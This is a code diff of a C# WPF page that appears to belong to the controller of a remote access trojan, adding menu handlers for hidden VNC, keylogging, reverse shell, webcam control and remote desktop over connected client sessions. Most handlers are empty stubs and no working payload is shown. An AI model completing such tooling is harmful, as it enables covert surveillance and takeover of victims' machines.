@@ -1,12 +1,15 @@
 ﻿using Common.DTOs.MessagePack;
 using Server.CoreServerFunctionality;
+using Server.Generated;
 using Server.Helper;
+using Server.UtilityWindows;
 using System.Collections.ObjectModel;
 using System.Collections.Specialized;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Input;
 using System.Windows.Media;
+using System.Windows.Media.Imaging;
 
 namespace Server.UI.Pages.ClientPage
 {
@@ -40,15 +43,16 @@ namespace Server.UI.Pages.ClientPage
         private void MapCollectionToGrid()
         {
             dataGrid.Items.Clear();
-            foreach (var item in ClientHandler._sessions) 
-            { 
+            foreach (var item in ClientHandler._sessions)
+            {
                 dataGrid.Items.Add(item);
             }
         }
 
+        
         private async void dataGrid_LoadingRow(object sender, DataGridRowEventArgs e)
         {
-            //e.Row.ContextMenu = await BuildContextMenu();
+            e.Row.ContextMenu = (ContextMenu)FindResource("utilityContextMenu");
         }
 
         #region DataGrid Features
@@ -124,5 +128,64 @@ namespace Server.UI.Pages.ClientPage
             return parentObject is T parent ? parent : FindParent<T>(parentObject);
         }
         #endregion
+
+        private void AudioManager_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void FileManager_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void HVNC_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void KeyLogger_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void RegistryManager_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void RemoteDesktop_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new RemoteDesktop(serverSession));
+        }
+
+        private void ReverseShell_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void SystemInfo_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void TaskManager_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void WebcamControl_Click(object sender, RoutedEventArgs e)
+        {
+            
+
+        }
+
+        ServerSession serverSession;
+        private void ContextMenu_Opened(object sender, RoutedEventArgs e)
+        {
+            serverSession =  ((ServerSession)(((DataGridRow)((ContextMenu)sender).PlacementTarget)).DataContext);
+        }
+
+
     }
 }
